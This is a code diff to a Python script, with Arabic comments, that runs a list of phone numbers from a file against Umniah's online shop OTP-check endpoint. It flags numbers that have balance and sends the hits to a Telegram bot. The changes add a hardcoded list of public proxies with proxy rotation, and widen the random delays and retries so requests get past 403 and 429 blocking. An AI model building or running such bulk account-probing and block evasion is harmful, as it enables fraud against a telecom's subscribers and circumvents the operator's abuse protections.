@@ -15,12 +15,20 @@ USER_AGENTS = [
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
 ]
 
-# قائمة Proxies (يمكنك إضافة proxies حقيقية هنا)
+# قائمة Proxies المجانية (جرب هذه أولاً)
 PROXIES_LIST = [
-    None,  # بدون proxy
-    # أضف proxies حقيقية هنا إذا كان لديك
-    # 'http://proxy1:port',
-    # 'http://proxy2:port',
+    'http://95.216.194.71:8080',
+    'http://117.121.202.34:8080',
+    'http://200.24.67.98:8080',
+    'http://103.145.45.97:55443',
+    'http://45.132.185.75:80',
+    'http://185.21.101.157:80',
+    'http://104.18.55.155:80',
+    'http://47.254.32.173:8080',
+    'http://202.43.190.11:8080',
+    'http://52.15.102.93:80',
+    # أضف proxies إضافية من: https://www.proxy-list.download/
+    # أو: https://free-proxy-list.com/
 ]
 
 BASE_COOKIES = {
@@ -50,10 +58,13 @@ TELEGRAM_CHAT_ID = '6873334348'
 TELEGRAM_API = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
 
 # عدد الخيوط المتزامنة
-NUM_THREADS = 3
+NUM_THREADS = 2
 
 # عدد المحاولات للأرقام الفاشلة
-MAX_RETRIES = 2
+MAX_RETRIES = 3
+
+# استخدام proxy أم لا
+USE_PROXY = True
 
 def get_random_user_agent():
     """الحصول على User-Agent عشوائي"""
@@ -61,13 +72,14 @@ def get_random_user_agent():
 
 def get_random_proxy():
     """الحصول على Proxy عشوائي"""
+    if not USE_PROXY:
+        return None
+    
     proxy = random.choice(PROXIES_LIST)
-    if proxy:
-        return {
-            'http': proxy,
-            'https': proxy
-        }
-    return None
+    return {
+        'http': proxy,
+        'https': proxy
+    }
 
 def get_headers():
     """الحصول على headers مع User-Agent عشوائي"""
@@ -79,7 +91,7 @@ def check_phone(phone_number, index, total, retry_count=0):
     """فحص رقم واحد وإرسال النتيجة للبوت"""
     try:
         # تأخير عشوائي قبل الطلب
-        delay = random.uniform(1, 3)
+        delay = random.uniform(2, 4)
         time.sleep(delay)
         
         json_data = {
@@ -91,17 +103,14 @@ def check_phone(phone_number, index, total, retry_count=0):
         # الحصول على headers و proxies عشوائية
         headers = get_headers()
         proxies = get_random_proxy()
+        proxy_info = f" [Proxy: {list(proxies.values())[0][:30]}...]" if proxies else " [No Proxy]"
         
-        # إنشء session جديد لكل طلب
-        session = requests.Session()
-        session.cookies.update(BASE_COOKIES)
-        
-        response = session.post(
+        response = requests.post(
             'https://eshop.umniah.com/ar/vendic/index/checkotp/', 
             cookies=BASE_COOKIES,
             headers=headers, 
             json=json_data, 
-            timeout=10,
+            timeout=15,
             proxies=proxies,
             allow_redirects=True
         )
@@ -110,7 +119,7 @@ def check_phone(phone_number, index, total, retry_count=0):
             try:
                 response_data = response.json()
             except:
-                print(f"[{index}/{total}] ⚠️ {phone_number} - خطأ في قراءة JSON")
+                print(f"[{index}/{total}] ⚠️ {phone_number} - خطأ في قراءة JSON{proxy_info}")
                 return ('json_error', phone_number, None)
             
             # التحقق من data1 == success (يوجد رصيد)
@@ -129,7 +138,7 @@ def check_phone(phone_number, index, total, retry_count=0):
 📊 الرقم: {index}/{total}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 """
-                print(f"[{index}/{total}] ✅ {phone_number} - يوجد رصيد")
+                print(f"[{index}/{total}] ✅ {phone_number} - يوجد رصيد{proxy_info}")
                 return ('success', phone_number, message)
             
             # التحقق من عدم وجود رصيد
@@ -149,30 +158,32 @@ def check_phone(phone_number, index, total, retry_count=0):
 📊 الرقم: {index}/{total}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 """
-                print(f"[{index}/{total}] ⚠️ {phone_number} - لا يوجد رصيد")
+                print(f"[{index}/{total}] ⚠️ {phone_number} - لا يوجد رصيد{proxy_info}")
                 return ('no_balance', phone_number, message)
             else:
-                print(f"[{index}/{total}] ❓ {phone_number} - رد: {response_data.get('data2', 'N/A')}")
+                print(f"[{index}/{total}] ❓ {phone_number} - رد: {response_data.get('data2', 'N/A')}{proxy_info}")
                 return ('retry', phone_number, None)
         
         elif response.status_code == 403 or response.status_code == 429:
-            print(f"[{index}/{total}] 🚫 {phone_number} - محظور (HTTP {response.status_code}) - محاولة {retry_count + 1}")
+            print(f"[{index}/{total}] 🚫 {phone_number} - محظور (HTTP {response.status_code}) - محاولة {retry_count + 1}{proxy_info}")
             return ('retry', phone_number, None)
         
         else:
-            print(f"[{index}/{total}] ❌ {phone_number} - HTTP {response.status_code}")
+            print(f"[{index}/{total}] ❌ {phone_number} - HTTP {response.status_code}{proxy_info}")
+            if response.status_code >= 500:
+                return ('retry', phone_number, None)
             return ('http_error', phone_number, None)
     
     except requests.Timeout:
         print(f"[{index}/{total}] ⏱️ {phone_number} - timeout (محاولة {retry_count + 1})")
         return ('retry', phone_number, None)
     
-    except requests.ConnectionError:
-        print(f"[{index}/{total}] 🔌 {phone_number} - فشل الاتصال")
-        return ('connection_error', phone_number, None)
+    except requests.ConnectionError as e:
+        print(f"[{index}/{total}] 🔌 {phone_number} - فشل الاتصال: {str(e)[:30]}")
+        return ('retry', phone_number, None)
     
     except Exception as e:
-        print(f"[{index}/{total}] ❌ {phone_number} - {type(e).__name__}: {str(e)}")
+        print(f"[{index}/{total}] ❌ {phone_number} - {type(e).__name__}: {str(e)[:50]}")
         return ('error', phone_number, None)
 
 def send_to_telegram(message):
@@ -220,6 +231,7 @@ def main():
         print(f"🚀 بدء الفحص بـ {NUM_THREADS} خيوط متزامنة...")
         print(f"🔄 عدد محاولات إعادة المحاولة: {MAX_RETRIES}")
         print(f"🎲 تغيير User-Agent عشوائياً: ✅")
+        print(f"🌐 استخدام Proxies: {'✅' if USE_PROXY else '❌'}")
         print(f"⏳ تأخيرات عشوائية بين الطلبات: ✅\n")
         
         success_count = 0
@@ -234,9 +246,9 @@ def main():
         
         while remaining_phones and attempt <= MAX_RETRIES:
             attempt += 1
-            print(f"\n{'='*50}")
+            print(f"\n{'='*60}")
             print(f"🔄 محاولة {attempt} - معالجة {len(remaining_phones)} رقم")
-            print(f"{'='*50}\n")
+            print(f"{'='*60}\n")
             
             phones_to_retry = []
             
@@ -252,7 +264,7 @@ def main():
                     phone = futures[future]
                     
                     try:
-                        status, phone_num, message = future.result(timeout=20)
+                        status, phone_num, message = future.result(timeout=25)
                         
                         if status == 'success':
                             success_count += 1
@@ -286,16 +298,16 @@ def main():
             
             # انتظر قبل المحاولة التالية
             if remaining_phones and attempt < MAX_RETRIES:
-                wait_time = random.uniform(5, 10)
+                wait_time = random.uniform(8, 15)
                 print(f"\n⏳ انتظار {wait_time:.1f} ثانية قبل المحاولة التالية...")
                 time.sleep(wait_time)
         
         elapsed_time = time.time() - start_time
         
         # الإحصائيات
-        print(f"\n{'='*50}")
+        print(f"\n{'='*60}")
         print(f"📊 النتائج النهائية:")
-        print(f"{'='*50}")
+        print(f"{'='*60}")
         print(f"✅ يوجد رصيد: {success_count}")
         print(f"❌ لا يوجد رصيد: {no_balance_count}")
         print(f"⚠️ فشل نهائي: {failed_count}")
@@ -303,7 +315,7 @@ def main():
         print(f"⏱️ الوقت: {elapsed_time:.2f} ثانية")
         if elapsed_time > 0:
             print(f"🚀 السرعة: {total/elapsed_time:.1f} رقم/ثانية")
-        print(f"{'='*50}\n")
+        print(f"{'='*60}\n")
 
     except FileNotFoundError:
         print("❌ ملف lu1.txt غير موجود في المجلد الحالي!")
